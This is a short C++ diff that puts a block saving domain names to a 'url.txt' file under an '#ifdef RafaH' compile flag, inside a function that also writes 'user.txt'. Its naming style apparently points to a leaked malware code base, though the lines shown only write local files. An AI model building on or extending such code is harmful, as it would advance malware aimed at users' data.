@@ -607,6 +607,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	pPathAppendA( fileName, "user.txt" );
 	File::WriteBufferA( fileName, azUser.t_str(), azUser.Length() );
 
+#ifdef RafaH
 	//сохраняем домены
 	char* mem = (char*)HEAP::Alloc(1024);
 	*mem = 0;
@@ -621,7 +622,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	pPathAppendA( fileName, "url.txt" );
 	File::WriteBufferA( fileName, mem, m_lstrlen(mem) );
 	HEAP::Free(mem);
-
+#endif //RafaH
 	return true;
 }
 
